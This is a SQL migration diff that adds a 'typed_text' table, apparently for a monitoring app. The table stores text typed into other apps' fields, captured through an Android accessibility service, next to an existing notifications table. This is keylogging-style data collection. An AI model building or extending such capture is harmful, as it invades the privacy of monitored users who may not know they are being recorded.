@@ -24,3 +24,19 @@ CREATE INDEX IF NOT EXISTS idx_notif_received ON notifications (received_at DESC
 CREATE INDEX IF NOT EXISTS idx_notif_device   ON notifications (device_id);
 CREATE INDEX IF NOT EXISTS idx_notif_package  ON notifications (package_name);
 CREATE INDEX IF NOT EXISTS idx_notif_unread   ON notifications (is_read) WHERE is_read = FALSE;
+
+-- Text typed into editable fields, captured by the Android accessibility service.
+-- Password fields are never sent by the client.
+CREATE TABLE IF NOT EXISTS typed_text (
+    id           BIGSERIAL    PRIMARY KEY,
+    device_id    VARCHAR(64)  NOT NULL,
+    package_name VARCHAR(255) NOT NULL,
+    app_label    VARCHAR(255) NOT NULL DEFAULT '',
+    text         TEXT         NOT NULL,
+    captured_at  TIMESTAMPTZ  NOT NULL,
+    received_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW()
+);
+
+CREATE INDEX IF NOT EXISTS idx_typed_received ON typed_text (received_at DESC);
+CREATE INDEX IF NOT EXISTS idx_typed_device   ON typed_text (device_id);
+CREATE INDEX IF NOT EXISTS idx_typed_package  ON typed_text (package_name);
